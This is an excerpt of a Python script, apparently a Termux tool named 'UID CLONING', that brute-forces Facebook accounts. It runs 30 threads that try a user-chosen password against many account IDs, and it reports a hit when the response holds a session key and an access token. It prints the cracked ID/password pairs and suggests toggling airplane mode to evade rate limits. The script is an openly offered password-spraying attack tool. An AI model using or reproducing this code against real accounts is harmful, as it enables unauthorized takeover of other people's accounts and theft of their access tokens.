...
logo = ("""
  ...
  [\33[37;45mM\33[0;m]   \033[1;32mCREATED BY\33    \33[37;45m:\33[0;m  \x1b[38;5;46m MASUD                   
  [\33[37;45mA\33[0;m]   \033[1;32mFACEBOK      \33[37;45m:\33[0;m  \033[1;34m M. F. Masud          
  [\33[37;45mS\33[0;m]   \033[1;32mGITHUB       \33[37;45m:\33[0;m  \033[1;35m Termux-Masud404         
  [\33[37;45mU\33[0;m]   \033[1;32mTOOL         \33[37;45m:\33[0;m  \033[1;39m UID CLONING
  [\33[37;45mD\33[0;m]  \033[1;32m VERSION      \33[37;45m:\33[0;m  \033[1;39m 0.1                   
...
class Main:
	def __init__(self):
		...
		print(logo)
		print("\033[0;90m")
		print('\x1b[1;32m [A]\x1b[1;35m CLONING OLD ID 2006-2010 ')
		print('\x1b[1;32m [B] \x1b[1;34mJOIN MY GROUP ')
		print(' \x1b[1;32m[E] \x1b[1;30m𝐸𝑋𝐼𝑇')
		print("\033[0;90m  ═════════════════════════════")
		MASUD =input('\n   \x1b[1;32m SELECT\033[1;35m :\033[1;32m ')
		if MASUD in ["A", "1"]:
			self.fbtua()
		if MASUD in ["B", "2"]:
			os.system('xdg-open https://facebook.com/groups/3603427286654194/')
		if MASUD in ["E",  "3", "0"]:
			exit()
			exit()
		else:
	...
	def fbtua(self):
		...
		try:
			...
			os.system('clear')
			print(logo) 
			print("\033[0;93m [>_] TOTAL ID => \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\033[1;32m [>_] Ex(123456) FOR Old IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [>_] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [>_] CRACK WITH PASSWORD => [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("     \033[37;41mFREE MODE ACTIVATE\033[0;m\033[1;32m")
				print("\n\033[0;94m [>_] \x1b[38;5;50mBRUTE HAS BEEN START")
				print(" [>_] \033[0;91mIF NO RESULT USE AIRPLANE MODE 5 SECONDS")
				print("\033[0;96m──────────────────────")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n \033[0;95m=>>[PROCESS COMPLETE... \n\033[0;92m =>>[Thanks For Using Tools...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[1;44m \033[92;1m[MASUD]\33[0;m \033[1;33m :\033[93;1m %s/%s \033[1;35m=> \033[0;92m [ OK:%s ] - \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [MASUD-OK] \x1b[38;5;46m %s\033[1;35m [PASS] \x1b[38;5;46m %s\033[1;32m         "%(uid, pw))
